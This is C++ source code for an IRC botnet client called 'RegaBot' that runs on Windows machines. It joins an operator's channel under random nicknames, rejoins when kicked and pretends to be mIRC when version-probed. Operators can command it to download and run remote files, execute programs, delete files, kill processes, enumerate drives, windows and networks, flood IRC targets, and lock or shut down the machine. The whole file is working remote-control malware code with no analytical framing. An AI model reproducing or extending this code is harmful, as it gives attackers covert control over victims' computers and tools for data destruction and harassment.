#include "stdafx.h"

CIRC::CIRC()
{
	//init normal vars
	iRemoved=0;
	iReturned=0;
	iInBuffer=0;
	iToRecieve=MSG_SIZE;
	iPongSuccess=0;
	iLineBreak=0;
	iStatus=0;
	iServerPort=0;
	iSendDelay=0;
	iActiveBot=1;

	//init arrays
	strcpy(szRecBuf, "");
	strcpy(szSendBuf, "");
	strcpy(szLine, "");
	strcpy(szNick, "");
	strcpy(szChannel, "");
	strcpy(szServer, ""); 
	strcpy(szCurrentDir, "C:\\");
	for(int i=0; i<25; i++)strcpy(szRandomNicks[i], "");
	for(int i=0; i<25; i++)strcpy(szAuthedUsers[i], "");

	//set new stark value for random
	srand(GetTickCount());
}

CIRC::~CIRC()
{
	//unload/disconnect
}


void CIRC::SendMessage(char *szMessage)
{
	sprintf(szSendBuf, "PRIVMSG %s :\x03\x34%s\r\n", szChannel, szMessage);
	Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
	Sleep(iSendDelay);
}

void CIRC::ParseMessages(char *szFromNick, char *szFromNick2, char *szDnsIP, char *szCommand, char *szTo, char *szMessage)
{	
	char szBotCommand[MSG_SIZE]="", szArg1[MSG_SIZE]="", szArg2[MSG_SIZE]="", szArg3[MSG_SIZE]="", *szTemp=0, szTemp2[MSG_SIZE]="";
	int iArgCount=0;

	if(szMessage[0]!='.')return;
	
	szTemp = CopyToCharacter(szMessage, szBotCommand, ' ');
	
	if(szTemp)
	{
		szTemp+=1;
		szTemp = CopyToCharacter(szTemp, szArg1, ' ');

		if(szTemp)
		{
			szTemp+=1;
			szTemp = CopyToCharacter(szTemp, szArg2, ' ');

			if(szTemp)
			{
				szTemp+=1;
				strcpy(szArg3, szTemp);
			}
		}
	}
	
	//commands without auth
	if(strcmp(szBotCommand, ".auth")==0)
	{
		CheckAuth(szFromNick, szArg1, szDnsIP);		
	}

	if(strcmp(szMessage, ".dns")==0)
	{
		if(!strstr(szTo, szChannel))
		{
			sprintf(szSendBuf, "PRIVMSG %s :\x03\x34Your DNS or IP is: %s\r\n", szFromNick, szDnsIP);
			Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		}
	}

	//set active bot, only for authed ppl
	if(IsAuthedUser(szFromNick, szDnsIP))
	{
		if(strcmp(szBotCommand, ".active")==0)
		{
			if(strcmp(szArg1, szNick)==0 || strcmp(szArg1, "all")==0)
			{
				iActiveBot=1;
			}
			else
			{
				iActiveBot=0;
			}
		}
	}

	//commands with auth and allowed to speak :)
	if(IsAuthedUser(szFromNick, szDnsIP) && iActiveBot==1)
	{
		if(strcmp(szBotCommand, ".op")==0)
		{
			sprintf(szSendBuf, "MODE %s +o %s\r\n", szChannel, szFromNick);
			Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		}

		if(strcmp(szBotCommand, ".voice")==0)
		{
			sprintf(szSendBuf, "MODE %s +v %s\r\n", szChannel, szFromNick);
			Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		}	

		if(strcmp(szBotCommand, ".version")==0)
		{
			sprintf(szSendBuf, "PRIVMSG %s :\x03\x34RegaBot version %i.%i\r\n", szChannel, REL_VERSION, SUB_VERSION);
			Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
		}

		if(strcmp(szBotCommand, ".quit")==0)
		{
			sprintf(szSendBuf, "QUIT :-\r\n");
			Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
			iStatus=1;
		}
	
		if(strcmp(szBotCommand, ".help")==0)
		{
			if(!strstr(szTo, szChannel))
			{
				/*
				.auth        .dns         .op           .voice      .version
				.quit        .help        .systeminfo   .delete     .kill
				.processlist .dir         .drivelist    .cd         .activeuser
				.messagebox  .ircflood    .noticeflood  .display    .run
				.download    .windowlist  .lock         .active     .time
				.uptime      .mac         .opendrive    .closedrive .taskbar
				.shutdown    .network
				*/
				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34Start of command listing\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.auth        .dns         .op           .voice      .version\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.quit        .help        .systeminfo   .delete     .kill\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.processlist .dir         .drivelist    .cd         .activeuser\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.messagebox  .ircflood    .noticeflood  .display    .run\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.download    .windowlist  .lock         .active     .time\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.uptime      .mac         .opendrive    .closedrive .taskbar\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34.shutdown    .network\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));
				Sleep(iSendDelay);

				sprintf(szSendBuf, "PRIVMSG %s :\x03\x34 End of command listing\r\n", szFromNick);
				Con.C_SendToServer(0, szSendBuf, (int)strlen(szSendBuf));				
			}
		}

		//real bot commands
		if(strcmp(szBotCommand, ".systeminfo")==0)
		{
			GetCurrentSystemInfo();
		}

		if(strcmp(szBotCommand, ".delete")==0)
		{
			DeleteFileOnDisk(szArg1);
		}

		if(strcmp(szBotCommand, ".kill")==0)
		{
			KillProcess(szArg1);
		}

		if(strcmp(szBotCommand, ".processlist")==0)
		{
			EnumProccesses();
		}

		if(strcmp(szBotCommand, ".dir")==0)
		{
			FindFiles();
		}

		if(strcmp(szBotCommand, ".drivelist")==0)
		{
			FindDrives();
		}

		if(strcmp(szBotCommand, ".cd")==0)
		{
			SetCurrentDir(szArg1);
		}

		if(strcmp(szBotCommand, ".activeuser")==0)
		{
			ActiveUser();
		}

		if(strcmp(szBotCommand, ".messagebox")==0)
		{
			MessageBox(0,szMessage+12,"Error",0);
		}

		if(strcmp(szBotCommand, ".ircflood")==0)
		{
			//To, count, message
			IRCFlood(szArg1, szArg2, szArg3);
		}

		if(strcmp(szBotCommand, ".noticeflood")==0)
		{
			//To, count, message
			NoticeFlood(szArg1, szArg2, szArg3);
		}

		if(strcmp(szBotCommand, ".display")==0)
		{
			if(strcmp(szArg1, "black")==0)SetDisplay(0);
			if(strcmp(szArg1, "on")==0)SetDisplay(1);			
			if(strcmp(szArg1, "off")==0)SetDisplay(2);
		}

		if(strcmp(szBotCommand, ".run")==0)
		{
			RunApp(szMessage+5, 0);
		}

		if(strcmp(szBotCommand, ".download")==0)
		{
			int iRun=0;
			
			if(strcmp(szArg1, "1")==0)iRun=1;

			if(strcmp(szArg1, "1")==0 || strcmp(szArg1, "0")==0)
			{
				DownloadFile(szArg2, szArg3, iRun, 0);
			}
		}

		if(strcmp(szBotCommand, ".windowlist")==0)
		{
			FindWindows();
		}

		if(strcmp(szBotCommand, ".lock")==0)
		{
			LockWorkStation();
		}

		if(strcmp(szBotCommand, ".time")==0)
		{
			GetTime();
		}

		if(strcmp(szBotCommand, ".uptime")==0)
		{
			GetSystemUptime();
		}

		if(strcmp(szBotCommand, ".mac")==0)
		{
			GetMacOfAllCards();
		}

		if(strcmp(szBotCommand, ".opendrive")==0)
		{
			OpenDrive(szArg1);
		}

		if(strcmp(szBotCommand, ".closedrive")==0)
		{
			CloseDrive(szArg1);
		}

		if(strcmp(szBotCommand, ".taskbar")==0)
		{
			SetTaskbarStatus(szArg1);
		}

		if(strcmp(szBotCommand, ".shutdown")==0)
		{
			Shutdown(szArg1);
		}

		if(strcmp(szBotCommand, ".network")==0)
		{
			int iDepth=0;

			SendMessage("Start of Network listing");
			GetNetworkInfo(NULL, &iDepth);
			SendMessage("End of Network listing");
		}

	}
}

DWORD WINAPI CIRC::ServerThread(LPVOID lpNothing)
{	
	//Get pointer of class
	CIRC *CTemp=(CIRC*)lpNothing;
	
	//some variablez
	DWORD dwLastTick=0;
	int iMessageType=0, iSendPosition=0, iSocketStatus=0;
	char szTemp[MSG_SIZE]="", szFromNick[MSG_SIZE]="", szFromNick2[MSG_SIZE]="", szDnsIP[MSG_SIZE]="", szCommand[MSG_SIZE]="", szTo[MSG_SIZE]="", szMessage[MSG_SIZE]="";
	
	//init network class and connect to server
	CTemp->Con.InitWinsock();
	CTemp->Con.SetNumberOfConnections(1);
	CTemp->Con.SetSelectTimeout(100,0);
	CTemp->Con.C_ConnectToServer(CTemp->szServer, CTemp->iServerPort);

	while(CTemp->iStatus==0)
	{				
		//join channel
		if(iSendPosition==2 && CTemp->iPongSuccess==1 && (dwLastTick + 3500)<GetTickCount())
		{
			sprintf(CTemp->szSendBuf, "JOIN %s\r\n", CTemp->szChannel);
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			iSendPosition+=1;
		}

		//auth with user data
		if(iSendPosition==1 && (dwLastTick + 3500)<GetTickCount())
		{
			sprintf(CTemp->szSendBuf, "USER %s \"\" \"*\" :_%s_\r\n", CTemp->szNick, CTemp->szNick);
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			iSendPosition+=1;
			dwLastTick=GetTickCount();
		}

		//set nickname
		if(iSendPosition==0)
		{
			int iRnd=rand()%10;
			sprintf(CTemp->szSendBuf, "NICK %s\r\n", CTemp->szRandomNicks[iRnd]);
			strcpy(CTemp->szNick, CTemp->szRandomNicks[iRnd]); 
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			iSendPosition+=1;
			dwLastTick=GetTickCount();
		}

		//run class code for select and recv
		iSocketStatus = CTemp->Con.C_RunClient();
		CTemp->GetServerResponseLine();

		//reconnect to server when error in server reply or socket error
		if(strstr(CTemp->szLine, "ERROR :") || iSocketStatus<0)
		{
			//BUGFIX 30.07.2006
			//add delay to avoid k-line from server
			Sleep(60000);
			CTemp->Con.C_ConnectToServer(CTemp->szServer, CTemp->iServerPort);
			dwLastTick=0;
			iMessageType=0;
			iSendPosition=0;
			iSocketStatus=0;
			CTemp->iActiveBot=1;
			memset(CTemp->szLine, 0, MSG_SIZE);
		}

		//rejoin on a kick
		if(strstr(CTemp->szLine, " KICK "))
		{
			sprintf(CTemp->szSendBuf, "JOIN %s\r\n", CTemp->szChannel);
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
		}

		//Return Reply to Server
		if(strstr(CTemp->szLine,"PING :"))
		{
			sprintf(CTemp->szSendBuf, "PONG :%s\r\n", CTemp->szLine + 6);
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			CTemp->iPongSuccess=1;
		}

		//reply faked IRC client on request
		if(strstr(CTemp->szLine,":.VERSION"))
		{			
			//get source of VERSION request
			for(int i=1; i<(int)strlen(CTemp->szLine); i++)
			{
				if(CTemp->szLine[i]=='!')
				{
					for(int a=1; a<i; a++)
					{
						szTemp[a-1]=CTemp->szLine[a];
						szTemp[a]=0;
					}
					break;
				}
			}
			
			sprintf(CTemp->szSendBuf, "NOTICE %s :.VERSION mIRC v6.16 Khaled Mardam-Bey.\r\n", szTemp);
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			CTemp->iPongSuccess=1;
		}

		//parse IRC commands from server
		memset(szFromNick, 0, MSG_SIZE);
		memset(szFromNick2, 0, MSG_SIZE);
		memset(szDnsIP, 0, MSG_SIZE);
		memset(szCommand, 0, MSG_SIZE);
		memset(szTo, 0, MSG_SIZE);
		memset(szMessage, 0, MSG_SIZE);
		
		if(CTemp->GetServerArguments(CTemp->szLine, szFromNick, szFromNick2, szDnsIP, szCommand, szTo, szMessage))
		{
			//messages from channel or user
			if(strcmp(szCommand, "PRIVMSG")==0)
			{
				CTemp->ParseMessages(szFromNick, szFromNick2, szDnsIP, szCommand, szTo, szMessage);
			}

			//notice from user or server
			if(strcmp(szCommand, "NOTICE")==0)
			{
				//CODE FOR NOTICE HERE
			}

			//delete user from authed list
			if(strcmp(szCommand, "NICK")==0 || strcmp(szCommand, "QUIT")==0 || strcmp(szCommand, "PART")==0)
			{
				CTemp->DeleteAuthedUser(szFromNick, szDnsIP);
			}						
		}

		//if nickname is already in use, try another one
		if(strstr(CTemp->szLine, " 433 "))
		{
			int iRnd=rand()%20;
			sprintf(CTemp->szSendBuf, "NICK %s\r\n", CTemp->szRandomNicks[iRnd]);
			strcpy(CTemp->szNick, CTemp->szRandomNicks[iRnd]); 
			CTemp->Con.C_SendToServer(0, CTemp->szSendBuf, (int)strlen(CTemp->szSendBuf));
			iSendPosition+=1;
		}
		
		//reset our parse line against errors
		memset(CTemp->szLine, 0, MSG_SIZE);
	}

	memset(szFromNick, 0, MSG_SIZE);
	memset(szFromNick2, 0, MSG_SIZE);
	memset(szDnsIP, 0, MSG_SIZE);
	memset(szCommand, 0, MSG_SIZE);
	memset(szTo, 0, MSG_SIZE);
	memset(szMessage, 0, MSG_SIZE);

	return 0;
}



